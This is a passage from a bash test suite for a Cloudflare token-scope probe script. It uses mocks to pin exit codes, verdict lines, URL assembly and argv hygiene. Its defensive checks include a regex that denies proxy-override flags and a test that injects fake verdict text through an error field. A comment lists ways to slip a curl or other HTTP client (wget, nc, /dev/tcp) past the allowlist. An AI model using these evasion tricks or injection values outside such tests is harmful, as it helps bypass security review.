assert_proxy_with_target "D2 --socks5= beside real target logs only transfer URL" "--socks5=$NOTIF_URL"
assert_proxy_with_target "D2 --socks5-hostname separated beside real target logs only transfer URL" --socks5-hostname "$NOTIF_URL"
assert_proxy_with_target "D2 --socks5-hostname= beside real target logs only transfer URL" "--socks5-hostname=$NOTIF_URL"
assert_proxy_with_target "D2 -x separated beside real target logs only transfer URL" -x "$NOTIF_URL"
assert_proxy_with_target "D2 -x attached beside real target logs only transfer URL" "-x$NOTIF_URL"
assert_proxy_with_target "D2 -sSx separated beside real target logs only transfer URL" -sSx "$NOTIF_URL"
assert_proxy_with_target "D2 -sSx attached beside real target logs only transfer URL" "-sSx$NOTIF_URL"
MOCK_DOPPLER_MARKER="$D2MARK" MOCK_CURL_URLLOG="$D2URLS" MOCK_NOTIF='200:{"success":true,"result":[{"id":"synthetic-policy-id"}]}' MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token
assert_rc 0 "D2 baseline LB 403s are exit-neutral -> exit 0"
# RUN-PATH URL ASSEMBLY pin (design-pass P2): inspect the actual request URLs,
# not only the mock's response, so wrong IDs, suffixes, or path/query drift red.
if [[ -s "$D2URLS" ]] \
   && grep -Fxq -- "$TUNNEL_URL" "$D2URLS" \
   && grep -Fxq -- "$ACCESS_URL" "$D2URLS" \
   && grep -Fxq -- "$DNS_URL" "$D2URLS" \
    && grep -Fxq -- "$NOTIF_URL" "$D2URLS" \
   && grep -Fxq -- "$LB_POOLS_URL" "$D2URLS" \
   && grep -Fxq -- "$LB_ZONE_URL" "$D2URLS" \
    && ! grep -qF -- '/notification_policies' "$D2URLS" \
    && ! grep -q '\$ZONE\|\$ACCT' "$D2URLS"; then
  ok "D2 all six run-path URLs are exact; Notifications has no legacy route or query suffix"
else
  no "D2 run-path URL assembly or profile route is wrong (see $D2URLS)"
fi
assert_eq "D2 logs exactly six profile URLs" 6 "$(wc -l < "$D2URLS" | tr -d '[:space:]')"
assert_eq "D2 logs exactly one exact Notifications URL" 1 "$(grep -Fxc -- "$NOTIF_URL" "$D2URLS" || true)"
has_re 'accounts/<acct>/alerting/v3/policies[[:space:]]+authorized \(200\)' "D2 Notifications array-shaped 200 remains authorized with both LB rows at baseline 403"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403, err 10000\)' "D2 pools row prints per-row not-yet-widened (403, err 10000)"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened \(403, err 10000\)' "D2 zone-LB row prints not-yet-widened too (per-row, not aggregate)"
has "PASS: no scope dropped" "D2 baseline still PASSes the retained ledger"
has "NOTE: LB scope not-yet-widened — expected BEFORE the #11181 widen; re-run with --expect-lb-scopes after it" "D2 prints the NOTE summary line"
if grep -qw CF_API_TOKEN "$D2MARK" && ! grep -q CF_API_TOKEN_RULESETS "$D2MARK"; then
  ok "D2 run requested CF_API_TOKEN and never the rulesets secret (token binding)"
else
  no "D2 run requested the wrong secret (see $D2MARK)"
fi
# D2o: stdout-only channel pin (panel seat: NOTE/PASS were asserted through the
# merged capture, so moving them to stderr would have stayed green).
MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run_out "$MOCKPATH" --profile default-token
assert_rc 0 "D2o stdout-only baseline -> exit 0"
has "NOTE: LB scope not-yet-widened — expected BEFORE the #11181 widen; re-run with --expect-lb-scopes after it" "D2o NOTE line is on STDOUT"
has "PASS: no scope dropped" "D2o PASS line is on STDOUT"
lacks_err "NOTE: LB scope" "D2o NOTE is not on stderr"
# D2c mixed baseline (one authorized, one 403): per-row honesty; the set-level
# NOTE stands — accepted wording (data-integrity seat), assert mode gates per-row.
MOCK_LB_ZONE="$LB403" run_out "$MOCKPATH" --profile default-token
assert_rc 0 "D2c mixed baseline exits 0 (neutrality is per-row)"
has_re 'accounts/<acct>/lb/pools[[:space:]]+authorized \(200\)' "D2c authorized pool row reads authorized"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened' "D2c missing zone row still reads not-yet-widened"
has "NOTE: LB scope not-yet-widened" "D2c mixed state still prints the NOTE (accepted; gated per-row in assert mode)"
unset MOCK_LB_POOLS MOCK_LB_ZONE MOCK_DOPPLER_MARKER MOCK_CURL_URLLOG

# --- D3: a RETAINED capability at 403 is never excused by the neutrality arm —
#         pinned PER ROW across all four retained arms (code-quality seat P2:
#         one-row witness left 3 of 4 rows open to a class-column drift). ---
for d3_var in MOCK_TUNNEL MOCK_ACCESS MOCK_DNS MOCK_NOTIF; do
  export "$d3_var=$LB403"   # export (not declare): the mock child must inherit it
  run "$MOCKPATH" --profile default-token
  assert_rc 3 "D3 retained 403 on $d3_var -> exit 3, neutrality never consults retained rows"
  unset "$d3_var"
done
lacks "PASS: no scope dropped" "D3 omits 'no scope dropped'"
# addendum 9: the zone-control diagnostic names a probe default-token never issues.
lacks "zone control" "D3 default-token failure prints no rulesets-only zone-control line"

# --- D3n: Notifications 404 is not neutralized by the two expected baseline LB 403s. ---
MOCK_NOTIF='404:{"success":false,"errors":[{"code":10404}]}' MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token
assert_rc 3 "D3n Notifications 404 with expected LB baseline 403s -> exit 3"
has_re 'accounts/<acct>/alerting/v3/policies[[:space:]]+denied \(404, unverified — fail-closed\)' "D3n Notification 404 remains fail-closed"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403' "D3n account LB 403 remains baseline-neutral"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened \(403' "D3n zone LB 403 remains baseline-neutral"
lacks "PASS: no scope dropped" "D3n Notifications 404 prevents the retained-scope PASS"
unset MOCK_NOTIF MOCK_LB_POOLS MOCK_LB_ZONE

# --- D3s: only an HTTP 200 is authorized; a successful array body on 201 fails closed. ---
MOCK_NOTIF='201:{"success":true,"result":[]}' MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token
assert_rc 3 "D3s Notifications 201 with an otherwise valid array -> exit 3"
has_re 'accounts/<acct>/alerting/v3/policies[[:space:]]+denied \(201\)' "D3s non-200 Notifications response is denied"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403' "D3s expected account LB 403 remains baseline-neutral"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened \(403' "D3s expected zone LB 403 remains baseline-neutral"
lacks "PASS: no scope dropped" "D3s Notifications 201 prevents the retained-scope PASS"
unset MOCK_NOTIF MOCK_LB_POOLS MOCK_LB_ZONE

# --- D3m: a degraded Notification 200 is not authorization. ---
MOCK_OTHER='200:{"success":true,"result":[]}' MOCK_NOTIF='200:{"success":false,"result":[]}' MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token
assert_rc 3 "D3m degraded Notifications 200 -> exit 3"
has_re 'accounts/<acct>/alerting/v3/policies[[:space:]]+degraded \(200 body not success/array\)' "D3m degraded Notifications 200 is reported, not authorized"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403' "D3m expected account LB 403 remains baseline-neutral"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened \(403' "D3m expected zone LB 403 remains baseline-neutral"
lacks "PASS: no scope dropped" "D3m degraded Notifications response prevents the retained-scope PASS"
unset MOCK_NOTIF MOCK_LB_POOLS MOCK_LB_ZONE

# --- D3w: a Notification 200 with an object result violates the account-array contract. ---
MOCK_OTHER='200:{"success":true,"result":[]}' MOCK_NOTIF='200:{"success":true,"result":{"id":"synthetic-policy-id"}}' MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token
assert_rc 3 "D3w wrong-shape Notifications 200 -> exit 3"
has_re 'accounts/<acct>/alerting/v3/policies[[:space:]]+degraded \(200 body not success/array\)' "D3w Notifications object result is rejected by the array contract"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403' "D3w expected account LB 403 remains baseline-neutral"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened \(403' "D3w expected zone LB 403 remains baseline-neutral"
lacks "PASS: no scope dropped" "D3w wrong-shape Notifications response prevents the retained-scope PASS"
unset MOCK_NOTIF MOCK_LB_POOLS MOCK_LB_ZONE

# --- D3we: an empty object is still the wrong result shape for this account list. ---
MOCK_OTHER='200:{"success":true,"result":[]}' MOCK_NOTIF='200:{"success":true,"result":{}}' MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token
assert_rc 3 "D3we empty-object Notifications 200 -> exit 3"
has_re 'accounts/<acct>/alerting/v3/policies[[:space:]]+degraded \(200 body not success/array\)' "D3we empty object is rejected by the array contract"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403' "D3we expected account LB 403 remains baseline-neutral"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened \(403' "D3we expected zone LB 403 remains baseline-neutral"
lacks "PASS: no scope dropped" "D3we empty-object Notifications response prevents the retained-scope PASS"
unset MOCK_NOTIF MOCK_LB_POOLS MOCK_LB_ZONE

# --- D4: fail-closed layers hold on the new endpoints ---
MOCK_DNS='200:{"success":true,"result":null}' run "$MOCKPATH" --profile default-token
assert_rc 3 "D4a degraded 200 (result null) on a retained row -> exit 3"
unset MOCK_DNS
MOCK_LB_POOLS='200:{"success":true,"result":{"id":"x"}}' run "$MOCKPATH" --profile default-token
assert_rc 3 "D4b wrong-shape 200 (object on array endpoint) on a target row -> exit 3, never not-yet-widened"
lacks "not-yet-widened" "D4b wrong-shape prints no not-yet-widened row"
unset MOCK_LB_POOLS
MOCK_LB_POOLS='200:{"success":true,"result":null}' run "$MOCKPATH" --profile default-token
assert_rc 3 "D4c result:null 200 on a target row (baseline) -> exit 3 (Guard 2 M4 spec literal)"
lacks "not-yet-widened" "D4c prints no not-yet-widened row for the degraded shape"
unset MOCK_LB_POOLS

# --- D5: baseline LB 404 is a HARD fail (403 is the only expected-missing status) ---
MOCK_LB_ZONE='404:{"success":false}' run "$MOCKPATH" --profile default-token
assert_rc 3 "D5 baseline LB 404 -> exit 3 (fail-closed; Guard 2 M1 detector)"
has_re 'zones/<zone>/load_balancers[[:space:]]+denied \(404, unverified' "D5 names the failing row and its cause (per-row attribution)"
unset MOCK_LB_ZONE

# --- D6: assert mode with LB still 403 -> exit 3, FAIL line on STDOUT (addendum 1) ---
MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run_out "$MOCKPATH" --profile default-token --expect-lb-scopes
assert_rc 3 "D6 assert mode 403 -> exit 3"
has "FAIL: LB scope still absent — the widen was not applied to CF_API_TOKEN" "D6 FAIL verdict line present on stdout"
has_re 'accounts/<acct>/lb/pools[[:space:]]+denied \(403\)' "D6 per-row attribution: pools denied (403) on stdout"
has_re 'zones/<zone>/load_balancers[[:space:]]+denied \(403\)' "D6 per-row attribution: zone-LB denied (403) on stdout"
lacks "PASS: LB scopes present" "D6 omits the present line"
has_err "FAIL: retained-scope probe failed" "D6 generic FAIL stays on stderr (stream contract unchanged)"
lacks_err "LB scope still absent" "D6 still-absent verdict is stdout-only (addendum 1)"
unset MOCK_LB_POOLS MOCK_LB_ZONE

# --- D7: assert mode green -> exit 0 + present line (no NOTE: presence is not absence) ---
run "$MOCKPATH" --profile default-token --expect-lb-scopes
assert_rc 0 "D7 assert mode both authorized -> exit 0"
has "PASS: LB scopes present — confirm the 403->present transition against your pre-widen baseline" "D7 prints the present line"

# --- D8: half-green assert -> exit 3 (per-row gating) ---
MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token --expect-lb-scopes
assert_rc 3 "D8 assert mode one-of-two 403 -> exit 3 (per-row)"
has_re 'zones/<zone>/load_balancers[[:space:]]+denied \(403\)' "D8 names the blocking row (pools stays authorized)"
unset MOCK_LB_ZONE

# --- D2b: Guard 2 H2 (must-PASS): post-widen baseline, both LB authorized -> 0, no NOTE ---
run "$MOCKPATH" --profile default-token
assert_rc 0 "D2b baseline with LB already authorized -> exit 0 (neutrality is for absence, not presence)"
lacks "NOTE: LB scope not-yet-widened" "D2b prints no NOTE when the scopes are present"

# --- D14: assert-mode degraded-200 must NOT claim "still absent" wording (addendum 2:
#          the still-absent line is minted only for a real 403). ---
MOCK_LB_POOLS='200:{"success":false,"result":[]}' run_out "$MOCKPATH" --profile default-token --expect-lb-scopes
assert_rc 3 "D14 assert-mode degraded-200 -> exit 3"
lacks "FAIL: LB scope still absent" "D14 degraded-200 never asserts the still-absent cause"

# --- D9: usage errors exit 2 BEFORE any secret read (addendum 6: --profile mirrors
#          the --target-entrypoint missing-value arm shape). ---
: >"$DOPREQ"
MOCK_DOPPLER_MARKER="$DOPREQ" run "$MOCKPATH" --profile default-token
assert_rc 0 "D9pc positive control: a valid run DOES reach Doppler"
if [[ -s "$DOPREQ" ]]; then ok "D9pc marker mechanism live (D9's negatives are not vacuous)"; else no "D9pc marker never written — D9 negatives would pass vacuously"; fi
: >"$DOPREQ"
MOCK_DOPPLER_MARKER="$DOPREQ" run "$MOCKPATH" --profile bogus --dry-run
assert_rc 2 "D9a unknown profile -> exit 2"
lacks "# dry-run" "D9a unknown profile prints no recipes (the '# dry-run' block never starts)"
MOCK_DOPPLER_MARKER="$DOPREQ" run "$MOCKPATH" --profile default-token --target-entrypoint http_config_settings
assert_rc 2 "D9b default-token + --target-entrypoint -> exit 2"
MOCK_DOPPLER_MARKER="$DOPREQ" run "$MOCKPATH" --profile rulesets --expect-lb-scopes
assert_rc 2 "D9c rulesets + --expect-lb-scopes -> exit 2"
MOCK_DOPPLER_MARKER="$DOPREQ" run "$MOCKPATH" --profile
assert_rc 2 "D9d --profile with no value -> exit 2"
if [[ ! -s "$DOPREQ" ]]; then ok "D9 all four usage errors precede any Doppler read"; else no "D9 a usage error reached Doppler first"; fi

# --- D-mint: empty CF_API_TOKEN -> exit 2 naming the secret ---
MOCK_API_TOKEN='' run "$MOCKPATH" --profile default-token
assert_rc 2 "D-mint empty CF_API_TOKEN -> exit 2"
has "CF_API_TOKEN is empty or absent" "D-mint message names CF_API_TOKEN"

# --- D10: explicit --profile rulesets dry-run == no-flag dry-run (back-compat) ---
run "$MOCKPATH" --dry-run
cp "$OUTFILE" "$WORK/noflag.txt"
run "$MOCKPATH" --profile rulesets --dry-run
if cmp -s "$WORK/noflag.txt" "$OUTFILE"; then ok "D10 --profile rulesets dry-run identical to no-flag"; else no "D10 explicit rulesets dry-run diverged from no-flag"; fi

# --- D11: parameterized table-size pins (Guard 1 M3 detector; never a hard-coded 6) ---
run "$MOCKPATH" --dry-run
assert_eq "D11a rulesets prints exactly 5 curl recipes" 5 "$(count_f 'curl --disable')"
run "$MOCKPATH" --target-entrypoint http_request_transform --dry-run
assert_eq "D11b rulesets +target prints 6" 6 "$(count_f 'curl --disable')"
run "$MOCKPATH" --profile default-token --dry-run
assert_eq "D11c default-token prints exactly 6" 6 "$(count_f 'curl --disable')"

# --- D-e: orthogonal flags: assert flag with dry-run prints rows once, exit 0 ---
run "$MOCKPATH" --profile default-token --expect-lb-scopes --dry-run
assert_rc 0 "D-e expect+dry-run orthogonal -> exit 0"
assert_eq "D-e rows printed once" 6 "$(count_f 'curl --disable')"

# Table parses shared by D-conf and D-pc (parameterized — never literal 6/5/6).
PROF_DECL="$(sed -n 's/^PROFILES=(\(.*\))$/\1/p' "$SUT" | head -1)"
ZP_N="$(sed -n 's/^ZONE_PHASES=(\(.*\))$/\1/p' "$SUT" | head -1 | wc -w | tr -d '[:space:]')"
DT_N="$(awk '/^DT_ROWS=\(/ {f=1; next} f && /^\)/ {f=0} f && /^[[:space:]]*"/ {c++} END {print c+0}' "$SUT")"
# Migration-profile tables (#12931): rows counted from the SUT's own arrays.
tbl_n() { awk -v t="$1" '$0 ~ "^"t"=\\(" {f=1; next} f && /^\)/ {f=0} f && /^[[:space:]]*"/ {c++} END {print c+0}' "$SUT"; }
MW_RD_N="$(tbl_n MIG_WRITE_REDIRECTS_DNS)"; MC_RD_N="$(tbl_n MIG_CTRL_REDIRECTS_DNS)"
MW_ZR_N="$(tbl_n MIG_WRITE_ZONE_REST)";     MC_ZR_N="$(tbl_n MIG_CTRL_ZONE_REST)"

# --- D-conf: run-path CONFINEMENT pin (security seat P2): every EXECUTED curl
#          carries the #7873 confined form and the token value never rides argv.
#          The dry-run recipe literal was pinned since C8; the run path was not. ---
DARGV="$WORK/d-conf-argv.log"
MOCK_CURL_ARGV="$DARGV" run "$MOCKPATH" --profile default-token
assert_rc 0 "D-conf default-token run -> exit 0"
dargv_lines="$(wc -l < "$DARGV" | tr -d '[:space:]')"
assert_eq "D-conf one argv record per probe ($DT_N rows)" "$DT_N" "$dargv_lines"
DNP_BAD_ROWS="$(awk '
  {
    n = 0; star = 0; equals_form = 0
    for (i = 1; i <= NF; i++) {
      if ($i == "--noproxy") {
        n++
        if ($(i + 1) == "\\*") star++
      }
      if ($i ~ /^--noproxy=/) equals_form = 1
    }
    if (n != 1 || star != 1 || equals_form) bad++
  }
  END { print bad + 0 }
' "$DARGV")"
if [[ "$(grep -c -- '--disable' "$DARGV")" -eq "$DT_N" ]] \
   && [[ "$DNP_BAD_ROWS" -eq 0 ]] \
   && grep -q -- '-H @/dev/fd/' "$DARGV" \
   && ! grep -Eq -- '(^|[[:space:]])(--proxy|--proxy1\.0|--preproxy|--socks4a?|--socks5(-hostname)?)(=|[[:space:]]|$)|(^|[[:space:]])-x[^[:space:]]*([[:space:]]|$)|(^|[[:space:]])-[^-][^[:space:]]*x[^[:space:]]*([[:space:]]|$)' "$DARGV" \
   && ! grep -q -- 'xyz789' "$DARGV"; then
  ok "D-conf every probe confined (no proxy override), header via @/dev/fd, token never on argv"
else
  no "D-conf run-path confinement, proxy policy, or argv hygiene broken (see $DARGV)"
fi

# --- D-pc: PROFILES enumeration pin (Guard 1 M3 detector; parameterized from the
#          script's OWN tables, never literal 5/6/6 — panel seats P2). ---
if [[ -n "$PROF_DECL" ]]; then ok "D-pc PROFILES declares at least one profile (positive control)"; else no "D-pc PROFILES parse empty — enumeration below is vacuous"; fi
for dpc_p in $PROF_DECL; do
  case "$dpc_p" in
    rulesets)       dpc_want=$((ZP_N + 1)) ;;
    default-token)  dpc_want="$DT_N" ;;
    # every write row prints a deny-control recipe AND a grant recipe
    redirects-dns)  dpc_want=$((MC_RD_N + 2 * MW_RD_N)) ;;
    zone-rest)      dpc_want=$((MC_ZR_N + 2 * MW_ZR_N)) ;;
    *)              dpc_want=-1 ;;
  esac
  run "$MOCKPATH" --profile "$dpc_p" --dry-run
  assert_rc 0 "D-pc dry-run for profile $dpc_p -> exit 0"
  assert_eq "D-pc profile $dpc_p prints exactly its declared table ($dpc_want rows)" "$dpc_want" "$(count_f 'curl --disable')"
done
if [[ "$DT_N" -ge 2 ]]; then ok "D-pc default-token table declares >=2 target rows (assert mode has something to assert)"; else no "D-pc DT_ROWS under-declared"; fi

# --- D-x: xtrace refusal BEHAVIORAL (panel seat: previously only source-grepped). ---
XTLOG="$WORK/d-x-urls.log"
: >"$XTLOG"
( MOCK_CURL_URLLOG="$XTLOG" PATH="$MOCKPATH" "$BASHBIN" -x "$SUT" --profile default-token >"$WORK/d-x.out" 2>/dev/null )
RC=$?
assert_rc 78 "D-x running under bash -x -> exit 78 refusal"
if [[ ! -s "$XTLOG" ]]; then ok "D-x refusal issues no probe"; else no "D-x probed under xtrace!"; fi
if grep -qF -- "refusing to run under xtrace" "$WORK/d-x.out"; then ok "D-x refusal prints its FAIL verdict on stdout"; else no "D-x refusal printed no verdict line"; fi

# --- D-id: the ZONE/ACCT id acquisition is pinned too (the substitution D2 guards
#          depends on it; MOCK_ZONE/MOCK_ACCTID arms previously never exercised). ---
MOCK_ZONE='' run "$MOCKPATH" --profile default-token
assert_rc 2 "D-id empty CF_ZONE_ID -> exit 2"
has "CF_ZONE_ID is empty or absent" "D-id message names CF_ZONE_ID"
MOCK_ACCTID='' run "$MOCKPATH" --profile default-token
assert_rc 2 "D-idb empty CF_ACCOUNT_ID -> exit 2"
has "CF_ACCOUNT_ID is empty or absent" "D-idb message names CF_ACCOUNT_ID"

# --- D-charset: the --target-entrypoint refusal is user-reachable and must be
#          tested (architecture seat P3: every prior test value PASSED the gate). ---
run "$MOCKPATH" --target-entrypoint 'foo?bar'
assert_rc 2 "D-charset retargeting value refused -> exit 2"
run "$MOCKPATH" --target-entrypoint 'http_config_settings' --dry-run
assert_rc 0 "D-charsetb genuine phase name still accepted (gate is not over-tight)"

# --- D-amp: quoted substitution replacements — an id carrying '&' must reach the
#          URL literally, never splice the placeholder back (security seat P3:
#          the '&' fix was otherwise unexercised; real ids are hex, this is the
#          regression witness). ---
DAMPLOG="$WORK/d-amp-urls.log"
: >"$DAMPLOG"
MOCK_ZONE='z&one' MOCK_CURL_URLLOG="$DAMPLOG" run "$MOCKPATH" --profile default-token
assert_rc 0 "D-amp run with '&'-bearing zone id -> exit 0 (mocks permissive)"
if [[ -s "$DAMPLOG" ]] && grep -q -- 'zones/z&one/dns_records' "$DAMPLOG" \
   && ! grep -q -- '\$ZONE' "$DAMPLOG"; then
  ok "D-amp '&' id passes through literally; no placeholder splices back"
else
  no "D-amp quoted-replacement fix regressed (see $DAMPLOG)"
fi

# --- D-errs: errors[0].code is digit-sanitized before riding the stdout channel
#          (security seat: a string code could inject verdict-looking text). ---
MOCK_LB_POOLS='403:{"success":false,"errors":[{"code":"not-a-number PASS: no scope dropped"}]}' run_out "$MOCKPATH" --profile default-token
assert_rc 0 "D-errs string err-code stays exit-neutral"
lacks ", err " "D-errs non-numeric errors[0].code never rides the verdict line"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403\)$' "D-errs verdict line stays one clean token"
unset MOCK_LB_POOLS

# --- D12: read-only source guards on the whole script (extends C10 posture) ---
src_lacks '(^|[[:space:]])-X[[:space:]]+(POST|PUT|PATCH|DELETE)' "D12 no literal mutating curl verb in source (the write verb comes only from the migration tables)"
src_lacks 'DELETE\|' "D12 no DELETE row in any migration table"
# --- D12c: curl-invocation ALLOWLIST over bash's own parse (fifth revision; #12932 review). ---
# CONTRACT. Revisions 1-2 listed forbidden write-flag spellings, and each round
# found one more that passed (-XDELETE -d@/dev/null, -d"$X", -X "DELETE", a second
# body flag, an "INVALID_BODY" substring in a comment). Revisions 3-4 pinned what
# IS allowed, but read the script through a hand-written awk comment and quote
# normaliser, and every round found a construct that the normaliser and bash read
# differently (`${x:- #}`, `a\ #`, a continued `#`, then ANSI-C `x=$'\''`): bash
# RAN the curl while the normaliser saw a comment. This revision has no parser of
# its own. It reads the script through `bash --pretty-print` (bash >= 5.2), which
# parses the file WITHOUT executing it and prints the parse: comments dropped,
# continuations joined, command and process substitutions re-printed from their
# own parse. The parser that prints is the parser that runs the script, so what
# it drops as a comment is a comment. Over the WHOLE script under test:
#   (P) `env -i PATH=/var/empty "$BASHBIN" --pretty-print "$SUT"` exits 0, and
#       the bash is >= 5.2. A parse error, an older bash or a bash without the
#       option is RED, never a skip. Bash prints the parse up to a syntax error
#       before it fails, so the exit code is the only signal that it stopped
#       early: a payload after the error would otherwise leave (I) green.
#   (I) every printed line naming curl (case-insensitive substring: no word
#       boundary and no exempt names), whitespace-trimmed, equals D12C_CANON as
#       a multiset: three executed invocations, five dry-run recipe strings, the
#       prerequisite loop and the env unset. A new curl site, an edited one, a
#       duplicated one or a removed one is RED. So is a curl appended to a line
#       that holds a canonical form: pretty-print prints a list on one line, so
#       that line no longer equals its canonical form.
#   (S) the same, with every ' " and \ deleted from both sides. Bash prints a
#       word as written, so a name split by quotes or a backslash (`cu""rl`,
#       `cur\l`) says curl only in the stripped copy.
#   (F) a LINT of D12C_CANON, not an independent check of the script: every
#       canonical form uses only the read flags --disable --noproxy -sS
#       --max-time -w -H, plus -X and --data-binary as a PAIR: -X takes only the
#       table variable ("$method" / $w_method) and the one body word is exactly
#       "$w_body", which mig_req's closed body-kind case sets only from the two
#       readonly literals INVALID_BODY and SETTINGS_PROBE_BODY (the w_body
#       write-form set below pins that). (I) makes the script's curl lines equal
#       to D12C_CANON, so (F) on the canon covers the script; its mutants are
#       applied to a copy of D12C_CANON.
#   (U) the curl mock refuses any flag it does not model (logs UNMODELLED, exit
#       64), and U1 at the end of the suite asserts no run in this file hit that.
# WHAT (I) AND (S) QUANTIFY OVER: every command bash parses from the file, at any
# nesting (function bodies, compound commands, command and process
# substitutions), after bash itself has removed comments and continuations. A
# curl that the file can run without building its name at run time is on a
# printed line. No comment, quote or continuation shape is left to desync,
# because there is no second parser to desync from.
# RESIDUALS, left to review (what --pretty-print does not see):
#   - a name built at run time: indirection or concatenation (`c=cu; "${c}rl"`,
#     `c${e}url`, `c$()url`), `$'\x63'url`, eval of a string, a variable that
#     assembles the command. The parse holds the expansion, not its value, and
#     (S) strips only ' " \;
#   - a name built by pathname or brace expansion, which needs no variable: a
#     glob that matches the curl binary (a bracket expression or `?` in place of
#     a letter of the path) or a brace alternation that expands to it. Bash
#     prints both as written, so no printed line names curl, even after (S);
#   - text that is data to this parse and code to another: a heredoc or string
#     fed to an interpreter, a sourced file, a second script. A heredoc body is
#     printed verbatim, so a curl there reds (I) unless it replaces a canonical
#     line exactly;
#   - non-curl HTTP clients (wget, nc, /dev/tcp, a python/node/perl runtime);
#   - the VALUES of $method and of the two body literals (pinned by D12, M0,
#     M0s, M1, M2 and the
#     SUT's own table tripwire, not here); curl behaviour from outside argv (the
#     canonical forms carry --disable and --noproxy '*', nothing more); and
#     whether a canonical form is itself safe, which is the review that accepted
#     it into D12C_CANON. Changing D12C_CANON is a reviewed act, not a refresh.
#     Its lines are bash's own printing of the reviewed source (measured equal on
#     bash 5.2.21, Ubuntu 24.04, and 5.3.20), so a printing change in a future
#     bash reds (I) and is reviewed, never silently admitted.
# Body constants and the D12c write anchor, at ONE site (M0/M0s/M1/M2/M10 read the
# bodies; D12c reads the anchor). WANT_SET_BODY is hardcoded: the one anchor that
# does not come from the script, so a change to the probe body edits two files.
INV_BODY="$(sed -n "s/^readonly INVALID_BODY='\(.*\)'$/\1/p" "$SUT" | head -1)"
SET_BODY="$(sed -n "s/^readonly SETTINGS_PROBE_BODY='\(.*\)'$/\1/p" "$SUT" | head -1)"
WANT_SET_BODY='{"items":[{"id":"cf_token_scope_probe_nonexistent_setting","value":"cf_token_scope_probe_never_valid"}]}'
# shellcheck disable=SC2016  # literal source text is the anchor
D12C_WRITE_ANCHOR='--data-binary "$w_body"'
# The flag allowlist (F). Input: one canonical line per row. Prints each offending row.
D12C_FLAGS="$WORK/d12c-flags.awk"
cat >"$D12C_FLAGS" <<'AWK'
$0 == "for bin in curl doppler jq;" { next }
$0 ~ /^unset [A-Z_ ]+$/ { next }
{
  s = $0; p = match(tolower(s), /curl/); if (!p) { print "no-curl-word: " $0; next }
  s = substr(s, p + 4); gsub(/\\"/, "\"", s); gsub(/\\\$/, "$", s)
  n = split(s, w, " "); bad = ""; nx = 0; nb = 0
  for (k = 1; k <= n; k++) {
    if (w[k] !~ /^-/) continue
    if (w[k] ~ /^(--disable|--noproxy|-sS|--max-time|-w|-H)$/) continue
    if (w[k] == "-X") { nx++; if (w[k + 1] != "\"$method\"" && w[k + 1] != "$w_method") bad = bad " -X<" w[k + 1] ">"; continue }
    if (w[k] == "--data-binary") { nb++; if (w[k + 1] != "\"$w_body\"") bad = bad " body<" w[k + 1] ">"; continue }
    bad = bad " flag<" w[k] ">"
  }
  if (nx > 1 || nb > 1 || nx != nb) bad = bad " -X/--data-binary not exactly one pair (" nx "/" nb ")"
  if (bad != "") print bad " :: " $0
}
AWK
# D12C_CANON: the reviewed curl-naming lines of `bash --pretty-print "$SUT"`, trimmed.
D12C_CANON="$WORK/d12c-canon.txt"
cat >"$D12C_CANON" <<'CANON'
unset SSLKEYLOGFILE CURL_CA_BUNDLE SSL_CERT_FILE SSL_CERT_DIR CURL_HOME HOSTALIASES LOCALDOMAIN RES_OPTIONS
[[ -n "$c_label" ]] || continue; printf '%s\n' "# control $c_label (want 200, success:true, .result $c_want)"; printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$$(mig_key "$c_key")\") $(mig_url "$c_url")";
printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -X $w_method -H 'Content-Type: application/json' --data-binary \"\$w_body\" -H @<(printf 'Authorization: Bearer %s' \"\$$(mig_key "$w_key")\") $(mig_url "$w_url")";
IFS='|' read -r r_class r_label r_url r_want r_scheme <<< "$row"; printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $r_url";
printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $API/zones/\$ZONE/rulesets/phases/$p/entrypoint";
done; printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $API/accounts/\$ACCT/rulesets"; exit 0;
for bin in curl doppler jq;
resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -H @<(printf 'Authorization: Bearer %s' "$TOK") "$url" 2> /dev/null || true)";
resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -H @<(printf 'Authorization: Bearer %s' "${MIG_TOK[$key]}") "$url" 2> /dev/null || true)"
